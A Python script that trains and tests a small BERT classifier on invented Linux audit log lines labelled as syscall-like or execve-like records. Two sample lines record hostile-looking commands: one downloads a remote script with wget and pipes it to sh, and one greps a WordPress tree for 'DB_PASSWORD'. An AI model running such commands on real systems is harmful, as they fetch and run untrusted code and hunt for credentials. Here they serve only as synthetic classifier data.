#!/usr/bin/env python3
"""
bert_train_test_minimal.py

A tiny end-to-end example:
- invent a few "log lines" + labels
- split into train/test (NO overlap)
- tokenize separately
- train BERT classifier for a few steps
- evaluate on test set

Install:
  pip install torch transformers
Run:
  python bert_train_test_minimal.py
"""

import torch
from transformers import AutoTokenizer, AutoModelForSequenceClassification
import random

torch.manual_seed(0)

# -----------------------------
# 1) More complex dataset (still learnable)
# Labels:
#   0 = EXECVE-like record (argc/a0/a1... or cmd=...)
#   1 = SYSCALL-like record (success/exit/syscall...)
# NOTE: no literal "type=SYSCALL"/"type=EXECVE" token anymore.
# -----------------------------
texts = [
    # --- SYSCALL-like (label 1): success/exit/syscall pattern ---
    'msg=audit(1765983301.992:1985): arch=c000003e success=yes exit=0 syscall=59 uid=0 auid=1000 tty=pts0 comm="sudo" exe="/usr/bin/sudo" key="cmd"',
    'msg=audit(1765983302.101:1986): arch=c000003e success=no  exit=-13 syscall=2 uid=33 auid=33 tty=(none) comm="apache2" exe="/usr/sbin/apache2" key="web"',
    'msg=audit(1765983302.220:1987): arch=c000003e success=yes exit=0 syscall=257 uid=0 auid=0 tty=(none) comm="systemd" exe="/usr/lib/systemd/systemd"',
    'msg=audit(1765983302.455:1988): arch=c000003e success=no  exit=-2 syscall=257 uid=1000 auid=1000 tty=pts1 comm="bash" exe="/usr/bin/bash" a0="openat"',
    'msg=audit(1765983302.490:1989): arch=c000003e success=yes exit=0 syscall=3 uid=0 auid=0 tty=(none) comm="rsyslogd" exe="/usr/sbin/rsyslogd"',
    'msg=audit(1765983302.777:1990): arch=c000003e success=yes exit=0 syscall=42 uid=1000 auid=1000 tty=pts1 comm="ssh" exe="/usr/bin/ssh" key="net"',
    'msg=audit(1765983303.002:1991): arch=c000003e success=no  exit=-1 syscall=87 uid=0 auid=0 tty=(none) comm="cron" exe="/usr/sbin/cron"',
    'msg=audit(1765983303.130:1992): arch=c000003e success=yes exit=0 syscall=1 uid=33 auid=33 tty=(none) comm="php-fpm" exe="/usr/sbin/php-fpm8.2" key="web"',
    'msg=audit(1765983303.201:1993): arch=c000003e success=yes exit=0 syscall=257 uid=1000 auid=1000 tty=pts2 comm="vim" exe="/usr/bin/vim" a0="/etc/hosts"',
    'msg=audit(1765983303.299:1994): arch=c000003e success=no  exit=-13 syscall=257 uid=33 auid=33 tty=(none) comm="nginx" exe="/usr/sbin/nginx" a0="/var/www/html/upload.tmp"',
    'msg=audit(1765983303.400:1995): arch=c000003e success=yes exit=0 syscall=59 uid=1000 auid=1000 tty=pts2 comm="python3" exe="/usr/bin/python3" key="dev"',
    'msg=audit(1765983303.501:1996): arch=c000003e success=no  exit=-5 syscall=42 uid=1000 auid=1000 tty=pts0 comm="curl" exe="/usr/bin/curl" key="net"',
    'msg=audit(1765983303.610:1997): arch=c000003e success=yes exit=0 syscall=257 uid=0 auid=0 tty=(none) comm="dockerd" exe="/usr/bin/dockerd" key="container"',
    'msg=audit(1765983303.720:1998): arch=c000003e success=no  exit=-13 syscall=2 uid=33 auid=33 tty=(none) comm="mysql" exe="/usr/sbin/mariadbd" key="db"',

    # --- EXECVE-like (label 0): argc/a0/a1... or cmd pattern ---
    'msg=audit(1765983310.010:2050): argc=3 a0="apt" a1="update" a2="-y" uid=0 auid=1000 tty=pts0 comm="apt" exe="/usr/bin/apt" cwd="/root"',
    'msg=audit(1765983310.120:2051): argc=4 a0="systemctl" a1="restart" a2="apache2" a3="--no-pager" uid=0 auid=1000 tty=pts0 comm="systemctl" exe="/usr/bin/systemctl" cwd="/root"',
    'msg=audit(1765983310.255:2052): argc=2 a0="journalctl" a1="-xe" uid=0 auid=1000 tty=pts0 comm="journalctl" exe="/usr/bin/journalctl" cwd="/root"',
    'msg=audit(1765983310.311:2053): argc=3 a0="tail" a1="-f" a2="/var/log/syslog" uid=0 auid=1000 tty=pts0 comm="tail" exe="/usr/bin/tail" cwd="/root"',
    'msg=audit(1765983310.444:2054): argc=3 a0="vim" a1="/etc/hosts" a2="+set" uid=1000 auid=1000 tty=pts2 comm="vim" exe="/usr/bin/vim" cwd="/home/alice"',
    'msg=audit(1765983310.520:2055): argc=5 a0="bash" a1="-lc" a2="grep -R \"DB_PASSWORD\" /var/www/wordpress" a3="2>/dev/null" a4="" uid=0 auid=1000 tty=pts1 comm="bash" exe="/usr/bin/bash" cwd="/root"',
    'msg=audit(1765983310.601:2056): argc=3 a0="python3" a1="script.py" a2="--dry-run" uid=1000 auid=1000 tty=pts1 comm="python3" exe="/usr/bin/python3" cwd="/home/bob"',
    'msg=audit(1765983310.710:2057): argc=2 a0="curl" a1="http://localhost/wp-json" uid=33 auid=33 tty=(none) comm="curl" exe="/usr/bin/curl" cwd="/var/www"',
    'msg=audit(1765983310.822:2058): argc=3 a0="find" a1="/var/log" a2="-maxdepth" uid=0 auid=1000 tty=pts0 comm="find" exe="/usr/bin/find" cwd="/root"',
    'msg=audit(1765983310.910:2059): argc=3 a0="ssh" a1="user@server" a2="-p22" uid=1000 auid=1000 tty=pts2 comm="ssh" exe="/usr/bin/ssh" cwd="/home/alice"',
    'msg=audit(1765983311.030:2060): cmd="/bin/sh -c wget -qO- http://10.0.0.5/p.sh | sh" uid=0 auid=0 tty=(none) comm="sh" exe="/bin/sh" cwd="/tmp"',
    'msg=audit(1765983311.140:2061): cmd="/bin/sh -c rm -rf /tmp/test && mkdir -p /tmp/test" uid=0 auid=1000 tty=pts1 comm="sh" exe="/bin/sh" cwd="/root"',
    'msg=audit(1765983311.250:2062): argc=2 a0="ls" a1="-la" uid=1000 auid=1000 tty=pts1 comm="ls" exe="/usr/bin/ls" cwd="/home/bob"',
    'msg=audit(1765983311.333:2063): argc=4 a0="docker" a1="ps" a2="--format" a3="{{.ID}}" uid=0 auid=1000 tty=pts0 comm="docker" exe="/usr/bin/docker" cwd="/root"',
    'msg=audit(1765983311.420:2064): argc=3 a0="php" a1="-v" a2="--ri" uid=33 auid=33 tty=(none) comm="php" exe="/usr/bin/php" cwd="/var/www"',
]

labels = torch.tensor(
    [1] * 14 + [0] * 15,
    dtype=torch.long
)


# -----------------------------
# 2) Train / test split (NO overlap)
# -----------------------------
# reproducibility
random.seed(42)
torch.manual_seed(42)

# zip texts and labels together
data = list(zip(texts, labels.tolist()))

# shuffle
random.shuffle(data)

# unzip after shuffle
texts_shuffled, labels_shuffled = zip(*data)
labels_shuffled = torch.tensor(labels_shuffled, dtype=torch.long)

# split (e.g. 75% train, 25% test)
split_idx = int(0.75 * len(texts_shuffled))

train_texts = list(texts_shuffled[:split_idx])
train_labels = labels_shuffled[:split_idx]

test_texts = list(texts_shuffled[split_idx:])
test_labels = labels_shuffled[split_idx:]


# -----------------------------
# 3) Tokenize train and test separately
# -----------------------------
tokenizer = AutoTokenizer.from_pretrained("bert-base-uncased")

train_inputs = tokenizer(
    train_texts,
    padding=True,
    truncation=True,
    max_length=128,
    return_tensors="pt",
)

test_inputs = tokenizer(
    test_texts,
    padding=True,
    truncation=True,
    max_length=128,
    return_tensors="pt",
)

# -----------------------------
# 4) Load model (pretrained encoder + new classification head)
# -----------------------------
model = AutoModelForSequenceClassification.from_pretrained(
    "bert-base-uncased",
    num_labels=2,
)

# -----------------------------
# 5) Minimal training loop (full-batch, just for demo)
# -----------------------------
model.train()
optimizer = torch.optim.AdamW(model.parameters(), lr=2e-5)

for step in range(30):
    optimizer.zero_grad()
    outputs = model(**train_inputs, labels=train_labels)
    loss = outputs.loss
    loss.backward()
    optimizer.step()
    if step % 5 == 0:
        print(f"step {step:02d} | train loss = {loss.item():.4f}")

# -----------------------------
# 6) Evaluate on test set (unseen data)
# -----------------------------
model.eval()
with torch.no_grad():
    out = model(**test_inputs)
    probs = torch.softmax(out.logits, dim=1)
    preds = torch.argmax(probs, dim=1)

acc = (preds == test_labels).float().mean().item()

print("\n--- TEST RESULTS ---")
for t, p, pr in zip(test_texts, test_labels.tolist(), preds.tolist()):
    print(f"true={p} pred={pr} | {t}")

print("\nProbabilities (test):")
print(probs)

print(f"\nTest accuracy: {acc:.3f}")
